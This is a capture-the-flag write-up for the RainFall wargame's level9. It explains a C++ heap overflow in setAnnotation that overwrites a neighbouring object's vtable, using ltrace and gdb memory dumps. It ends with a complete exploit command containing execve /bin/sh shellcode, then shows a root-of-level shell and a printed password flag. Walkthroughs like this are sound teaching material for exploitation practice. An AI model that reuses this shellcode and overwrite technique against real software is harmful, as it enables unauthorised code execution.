
# Analysis of the Binary

After extracting the source code from the binary, we analyze key components:

## Key Observations
- The program uses a class (`N`) with a vulnerable `setAnnotation` function and virtual functions, indicating a vtable.
- The first virtual function is called on the second object, presenting an opportunity for exploitation.

# Understanding Memory Layout

Using `ltrace`, we can find the memory addresses of objects:

```bash
level9@RainFall:~$ ltrace ./level9 test
[...]
_Znwj(108, 0xbffff7e4, 0xbffff7f0, 0xb7d79e55, 0xb7fed280)                                      = 0x804a008
_Znwj(108, 5, 0xbffff7f0, 0xb7d79e55, 0xb7fed280)                                               = 0x804a078
[...]
```
- `_Znwj` is the memory allocation function for objects.
- The addresses `0x804a008` and `0x804a078` are allocated for two objects, with a difference of 112 bytes.

We assume the following memory layout for each object: `[vtable (4 bytes)] [annotation (100 bytes)] [value (4 bytes)] [padding (4 bytes)]`.

# Exploit Development

The goal is to overwrite the vtable of the second object to manipulate the virtual function call.

## Steps for Exploitation
1. Use `setAnnotation` to overflow the first object and reach the second object's vtable.
2. Replace the vtable entry with a function pointer of our choice, like a shellcode address.

## Offset Calculation
- The offset to reach the second object from the first is 112 bytes.
- To overwrite the vtable of the second object, we need to write 108 bytes into the first object's annotation.
- We can then replace the vtable pointer.

```bash
(gdb) break _ZN1N13setAnnotationEPc
Breakpoint 1 at 0x8048714
(gdb) run `python -c 'print("A" * 112)'`
Starting program: /home/user/level9/level9 `python -c 'print("A" * 112)'`

Breakpoint 1, 0x08048714 in N::setAnnotation(char*) ()
(gdb) x/56wx 0x804a008
0x804a008:      0x08048848      0x00000000      0x00000000      0x00000000
0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a028:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a038:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a048:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a068:      0x00000000      0x00000000      0x00000005      0x00000071
0x804a078:      0x08048848      0x00000000      0x00000000      0x00000000
0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a098:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0d8:      0x00000000      0x00000000      0x00000006      0x00020f21
(gdb) step
Single stepping until exit from function _ZN1N13setAnnotationEPc,
which has no line number information.
0x0804867c in main ()
(gdb) x/56wx 0x804a008
0x804a008:      0x08048848      0x41414141      0x41414141      0x41414141
0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a028:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a038:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a048:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a058:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a068:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a078:      0x41414141      0x00000000      0x00000000      0x00000000
0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a098:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0d8:      0x00000000      0x00000000      0x00000006      0x00020f21
```

## Creating a Fake Vtable
Construct a fake vtable structure: `[fake function (shellcode address)] => [shellcode]`.

## Executing the Exploit

Construct the payload as follows:
- `[shellcode address] [shellcode] [padding to reach 108 bytes] [fake vtable address]`.

The exploit command:

```bash
$ ./level9  `python -c 'print("\x08\x04\xa0\x10"[::-1] + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A" * 83 + "\x08\x04\xa0\x0c"[::-1])'`
```

This command:
- Sends a payload with a shellcode.
- Overwrites the vtable of the second object.
- Triggers the execution of the shellcode when the virtual function is called.

Result:

```plaintext
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

The exploit successfully manipulates the memory layout, leading to unauthorized access.
